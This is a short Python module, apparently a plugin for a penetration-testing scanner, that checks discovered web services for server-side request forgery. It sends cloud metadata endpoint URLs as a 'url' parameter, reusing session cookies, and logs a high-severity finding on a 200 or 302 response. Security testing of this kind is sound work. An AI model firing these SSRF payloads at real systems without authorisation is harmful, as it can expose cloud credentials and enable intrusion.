import requests
from core.mitre import technique

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/",
]

def run(context):
    if not context.http_services:
        print("[SSRF] No HTTP services discovered, skipping")
        return

    for svc in context.http_services:
        base = svc["url"].rstrip("/")

        for payload in SSRF_PAYLOADS:
            test_url = f"{base}/?url={payload}"

            try:
                r = requests.get(
                    test_url,
                    headers=context.headers,
                    cookies=context.cookies,
                    timeout=5,
                    allow_redirects=False
                )

                if r.status_code in (200, 302):
                    print(f"[SSRF] 🚨 Potential SSRF via {test_url}")

                    context.add_finding({
                        "title": "Potential SSRF",
                        "severity": "High",
                        "url": test_url,
                        "evidence": f"HTTP {r.status_code}",
                        "mitre": technique("T1190"),
                        "risk": 8.0
                    })

            except Exception:
                pass

